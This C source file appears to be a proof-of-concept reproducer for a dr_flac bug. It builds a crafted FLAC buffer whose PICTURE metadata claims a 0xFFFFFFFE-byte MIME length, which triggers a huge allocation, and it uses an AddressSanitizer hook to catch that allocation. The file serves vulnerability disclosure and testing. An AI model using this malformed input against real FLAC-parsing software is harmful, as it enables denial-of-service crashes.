#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#if defined(__SANITIZE_ADDRESS__) || \
    (defined(__has_feature) && __has_feature(address_sanitizer))
#include <sanitizer/common_interface_defs.h>

void __sanitizer_malloc_hook(void *ptr, size_t size)
{
    (void)ptr;
    if (size < 512UL * 1024 * 1024)   /* ignore allocations below 512 MiB */
        return;
    __sanitizer_print_stack_trace();
    abort();
}
#endif

#define DR_FLAC_IMPLEMENTATION
#include "dr_flac.h"

static void on_meta(void *udata, drflac_metadata *m)
{
    (void)udata;
    printf("  [on_meta] type=%u\n", m->type);
}

int main(void)
{

    uint8_t payload[78];
    memset(payload, 0, sizeof(payload));

    payload[0] = 0x66; payload[1] = 0x4C;
    payload[2] = 0x61; payload[3] = 0x43;

    payload[4] = 0x00;
    payload[5] = 0x00; payload[6] = 0x00; payload[7] = 0x22;

    payload[42] = 0x86;
    payload[43] = 0x00; payload[44] = 0x00; payload[45] = 0x20;

    payload[50] = 0xFF; payload[51] = 0xFF;
    payload[52] = 0xFF; payload[53] = 0xFE;

    printf("dr_flac PICTURE mimeLength OOM reproducer\n");
    printf("Crafted mimeLength: 0xFFFFFFFE = %u bytes (%.2f GiB)\n\n",
           0xFFFFFFFEU, (double)0xFFFFFFFEU / (1024.0 * 1024.0 * 1024.0));
    printf("Calling drflac_open_memory_with_metadata()...\n");

    drflac *pFlac = drflac_open_memory_with_metadata(
        payload, sizeof(payload), on_meta, NULL, NULL);

    printf("\nResult: %s\n", pFlac ? "opened" : "NULL returned");
    if (pFlac)
        drflac_close(pFlac);

    return 0;
}
